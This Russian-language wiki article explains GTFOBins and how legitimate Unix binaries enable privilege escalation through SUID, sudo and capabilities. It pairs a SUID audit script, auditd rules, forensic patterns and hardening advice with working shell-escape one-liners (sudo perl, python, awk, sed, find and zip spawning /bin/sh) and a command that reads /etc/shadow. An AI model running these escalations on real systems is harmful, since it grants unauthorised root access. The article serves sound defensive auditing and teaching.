# GTFOBins

## Определения

**GTFOBins** ([gtfobins.github.io](https://gtfobins.github.io/)) — курируемый список Unix-бинарников, которые могут быть использованы для обхода локальных ограничений безопасности в неправильно настроенных системах.

Это **не инструмент**, а база знаний (сайт + GitHub-репозиторий), документирующая техники эксплуатации легитимных системных утилит.

> **Важно:** GTFOBins не содержит эксплойтов нулевого дня. Все техники используют «легитимное» поведение бинарников, которое становится опасным только при определенной конфигурации системы (SUID-бит, расширенные sudo-права, capabilities).

**Аналог для Windows:** [**LOLBAS**](https://lolbas-project.github.io/) (Living Off The Land Binaries, Scripts and Libraries) — аналогичный проект для ОС Windows, описывающий использование встроенных компонентов для обхода защиты.

**Формат данных:** Проект распространяет данные в виде текстового файла `/usr/share/gtfobins.txt` (или JSON-версии), который можно использовать для автоматизированного аудита. Каждая строка соответствует одному бинарнику и содержит секции техник.

## Основные концепции

### Принцип работы

Каждая запись в GTFOBins описывает один бинарный файл и набор техник его нестандартного использования для:

- **Повышения привилегий** — получение root-доступа через SUID-бит, sudo-права, capabilities.
- **Пост-эксплуатация** — reverse shell, чтение/запись файлов, обход ограничений оболочки.
- **Обхода ограничений** — выполнение команд в restricted shell (rbash, rssh), передача файлов.

### Почему легитимные утилиты опасны

В модели DAC (Discretionary Access Control) Linux утилиты наследуют привилегии родительского процесса. Когда бинарник запускается с SUID-битом, ядро устанавливает Effective UID (EUID) процесса в значение владельца файла (часто `0` — root). Если утилита позволяет выполнять произвольный код (встроенный интерпретатор, системные вызовы `execve()`, `system()`), злоумышленник может получить код, выполняемый с повышенными привилегиями.

Ключевые условия для эксплуатации:
1. **SUID-бит или sudo-права** на утилите, которая может выполнять внешние команды.
2. **Отсутствие NOEXEC** в sudoers (запрещает порождение дочерних процессов).
3. **Capabilities** с флагом `cap_setuid` или `cap_dac_override`.
4. **Writable docker.sock** или привилегированный контейнер.

### Категории техник

GTFOBins классифицирует техники по контексту эксплуатации:

| Категория | Описание | Пример |
|---|---|---|
| **SUID** | Бинарник с SUID-битом выполняется от имени владельца (часто root) | `find . -exec /bin/sh \; -quit` |
| **sudo** | Запуск через `sudo` с расширенными возможностями | `sudo find . -exec /bin/sh \; -quit` |
| **Capabilities** | Linux capabilities (`cap_setuid`, `cap_dac_override`) | `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'` |
| **Docker** | Эксплуатация через контейнеры или writable `docker.sock` | Монтирование host-filesystem в контейнер |
| **Restricted Shell** | Обход ограничений rbash, rssh | `vi` → `:!sh` |
| **File Read/Write** | Чтение/запись произвольных файлов через утилиту | `tar -cf /dev/null /etc/shadow --checkpoint=1` |
| **Shell Escape** | Получение полноценной оболочки из ограниченной | `awk 'BEGIN {system("/bin/sh")}'` |

### Взаимосвязь с механизмами безопасности

1.  **SUID-бит:** Ключевой вектор. Бинарник с SUID выполняется с правами владельца файла. Если утилита позволяет выполнять произвольный код, это ведет к немедленному захвату прав владельца (обычно `root`).
    > **Подробно:** [Специальные права: SUID/SGID](../../Linux/Security/Concepts/File_Permissions/special_permissions.md).
2.  **Capabilities:** Гранулярные привилегии. Даже если у бинарника нет SUID-бита, наличие `cap_setuid` позволяет ему сменить UID на 0.
    > **Подробно:** [Linux Capabilities](../../Linux/Security/Mechanisms/Capabilities.md).
3.  **Sudoers:** Неправильная настройка `/etc/sudoers` (например, разрешение запуска `vi` или `find` без пароля) позволяет пользователю «покинуть» утилиту и получить shell от имени `root`.
4.  **no_new_privs:** Флаг `no_new_privs` (доступен с ядра 3.5+, полная поддержка в Docker 1.13+ и K8s 1.24+) блокирует получение новых привилегий через `execve()`. Даже если процесс запускается от root, установленный `no_new_privs` не позволит SUID-бинарнику повысить привилегии. Это ключевой механизм защиты в контейнерах и systemd-юнитах.

## Практические сценарии

### Поиск векторов эскалации

```bash
# 1. Поиск файлов с SUID/SGID битами
find / -type f \( -perm -4000 -o -perm -2000 \) 2>/dev/null

# 2. Поиск файлов с установленными Capabilities
getcap -r / 2>/dev/null

# 3. Проверка разрешенных команд через sudo
sudo -l
```

### Пакетный аудит SUID-бинарников по базе GTFOBins

```bash
#!/bin/bash
# audit_gtfobins.sh — сравнение SUID-бинарников с базой GTFOBins
GTFO_TXT="/usr/share/gtfobins.txt"
LOG="/var/log/gtfobins_audit.log"

if [[ ! -f "$GTFO_TXT" ]]; then
    echo "База GTFOBins не найдена: $GTFO_TXT"
    echo "Скачайте: curl -L -o $GTFO_TXT https://github.com/GTFOBins/GTFOBins.github.io/raw/master/_gtfobins/gtfobins.txt"
    exit 1
fi

echo "=== Аудит SUID-бинарников: $(date '+%Y-%m-%d %H:%M:%S') ===" >> "$LOG"

# Найти все SUID-файлы и проверить их в базе
find / -xdev -type f -perm -4000 2>/dev/null | while read -r bin; do
    name=$(basename "$bin")
    if grep -q "^$name$" "$GTFO_TXT" 2>/dev/null; then
        echo "ОПАСНО: $bin — присутствует в GTFOBins" | tee -a "$LOG"
    fi
done

echo "---" >> "$LOG"
```

**Интеграция с cron (SRE):**
```cron
# /etc/cron.d/gtfobins_audit
# Еженедельный аудит в воскресенье в 03:00
0 3 * * 0 root /usr/local/bin/audit_gtfobins.sh
```

### Мониторинг через auditd (реальное время)

Для отслеживания попыток эксплуатации GTFOBins-техник:

```bash
# Мониторинг запуска shell из неожиданных бинарников
sudo auditctl -a always,exit -F arch=b64 -S execve -F exe=/usr/bin/find -k gtfobins_find
sudo auditctl -a always,exit -F arch=b64 -S execve -F exe=/usr/bin/vim -k gtfobins_vim

# Проверка логов:
sudo ausearch -k gtfobins_* --start recent | aureport -x --input-logs
```

### Форензика после подозрительной активности

```bash
# 1. Проверить историю bash/zsh на подозрительные команды
sudo grep -E 'find.*-exec|awk.*system|python.*os\.system|perl.*exec' /home/*/.bash_history /root/.bash_history

# 2. Найти процессы, запущенные из подозрительных бинарников
ps aux | grep -E 'find|awk|sed|vim|nano|less|more'

# 3. Проверить, не появились ли новые пользователи или изменения в /etc/passwd, /etc/shadow
sudo grep -n '^root:' /etc/passwd
sudo ls -l /etc/passwd /etc/shadow

# 4. Проверить auditd логи за последний час
sudo ausearch -k gtfobins_* --start recent

# 5. Найти новые SUID-файлы, появившиеся за последние 24 часа
sudo find / -xdev -type f -perm -4000 -mtime -1 2>/dev/null
```

### Примеры эксплуатации популярных утилит

#### Bash (SUID)
Если бинарник `bash` имеет SUID-бит (ошибка конфигурации), он может сбросить привилегии. Опция `-p` (privileged mode) предотвращает это:
```bash
/usr/bin/bash -p
```

#### Perl / Ruby / Python (sudo)
Скриптовые языки позволяют выполнить произвольный код одной строкой:
```bash
# Perl
sudo perl -e 'exec "/bin/sh";'

# Ruby
sudo ruby -e 'exec "/bin/sh"'

# Python
sudo python3 -c 'import os; os.system("/bin/sh")'
```

#### Find (SUID/sudo)
Использование встроенного ключа выполнения команд:
```bash
sudo find . -exec /bin/sh \; -quit
```

#### Vi / Vim (Shell Escape)
Выход в оболочку из текстового редактора:
```text
:!sh
# или
:set shell=/bin/sh
:shell
```

#### Zip / Tar (File Read/Shell)
Эксплуатация через опции выполнения команд или архивацию чувствительных файлов:
```bash
# Zip
sudo zip /tmp/test.zip /etc/shadow -T --unzip-command="sh -c /bin/sh"
```

#### AWK / Sed / NMAP (Shell Escape)
Утилиты с возможностью выполнения системных команд:
```bash
# AWK
sudo awk 'BEGIN {system("/bin/sh")}'

# Sed
sudo sed -n '1e/bin/sh' /etc/passwd

# NMAP (интерактивный режим)
sudo nmap --interactive
nmap> !sh
```

### Автоматизация с помощью `traitor`

Инструмент [traitor](./traitor.md) автоматизирует проверку бинарников на соответствие техникам GTFOBins:
```bash
# Сканирование и попытка автоматической эксплуатации
traitor -a
```

## Меры защиты (Hardening)

1.  **Принцип минимизации SUID:** Удаляйте SUID-бит с утилит, где он не обязателен.
    ```bash
    chmod u-s /usr/bin/binary
    ```
2.  **Безопасный Sudo:** При настройке `/etc/sudoers` используйте `NOEXEC`, чтобы запретить запускаемым программам порождать дочерние процессы (оболочки).
    ```text
    user ALL=(ALL) NOEXEC: /usr/bin/find
    ```
3.  **No New Privileges:** Используйте флаг `no_new_privs` для процессов (в Systemd, Docker, K8s), чтобы предотвратить получение новых прав через SUID/Capabilities.
4.  **Аудит (Auditd):** Настройте мониторинг выполнения команд с высокими привилегиями и аномального поведения (например, запуск `sh` из `vi`).
5.  **Системы принудительного контроля (MAC):** AppArmor и SELinux могут блокировать выполнение оболочек из приложений, которым это не свойственно по профилю.

### Дополнительные практические паттерны hardening

**Шаблон systemd-юнита с запретом новых привилегий:**
```ini
[Service]
NoNewPrivileges=yes
RestrictSUIDSGID=yes
ProtectSystem=strict
ProtectHome=yes
```

**Паттерн sudoers для предотвращения shell-escape:**
```text
# Запретить запуск внешних команд из редакторов
Defaults!vim        !syslog
Defaults!/usr/bin/vim  !sudoedit

# Запретить повышение привилегий через sudo для опасных утилит
# (если утилита не нужна в sudo — не добавляйте её)
```

**Монтирование с nosuid/noexec для пользовательских ФС:**
```bash
# /etc/fstab
UUID=... /home ext4 defaults,nosuid,nodev 0 2
UUID=... /tmp  ext4 defaults,nosuid,nodev,noexec 0 2
```

## Дополнительная информация

### Применение

- **CTF-соревнования** — базовый ресурс для эскалации привилегий.
- **Пентест / Red Team** — справочник техник для аудита конфигурации и пост-эксплуатации.
- **DevOps / SRE** — чек-лист для аудита безопасности образов и хостов.

### Интеграция с инструментами сканирования

GTFOBins является «движком» техник для:
- [**traitor**](./traitor.md) — локальная эскалация привилегий.
- **LinPEAS / LinuxSmartEnumeration** — скрипты всестороннего аудита системы.

### См. также
- [Специальные права: SUID/SGID](../../Linux/Security/Concepts/File_Permissions/special_permissions.md) — глубокий разбор механизмов.
- [Linux Capabilities](../../Linux/Security/Mechanisms/Capabilities.md) — гранулярное управление правами.
- [traitor](./traitor.md) — автоматизация эксплуатации.
